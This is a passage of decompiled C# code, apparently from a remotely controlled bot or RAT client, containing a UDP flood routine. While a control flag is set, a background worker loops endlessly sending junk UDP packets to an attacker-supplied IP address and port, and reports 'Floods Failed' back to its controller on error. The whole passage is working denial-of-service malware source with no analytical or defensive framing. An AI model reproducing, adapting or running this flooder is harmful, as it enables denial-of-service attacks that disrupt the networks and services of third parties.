					array = Encoding.ASCII.GetBytes("MeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEDEJFAEWDNHADUEDESUDESUDSUDESU");
					udpClient.Send(array, array.Length);
					Thread.Sleep(Timexxx);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				derp = 0;
				Send("Floods Failed");
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_11(object sender, DoWorkEventArgs e)
	{
		while (true)
		{
			try
			{
				if (derp == 1)
				{
					UdpClient udpClient = new UdpClient();
					byte[] array = new byte[0];
					IPAddress addr = IPAddress.Parse(IPxxx);
					udpClient.Connect(addr, Portxxx);
					array = Encoding.ASCII.GetBytes("MeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEDEJFAEWDNHADUEDESUDESUDSUDESU");
					udpClient.Send(array, array.Length);
					Thread.Sleep(Timexxx);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				derp = 0;
				Send("Floods Failed");
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_12(object sender, EventArgs e)
	{
	}
}
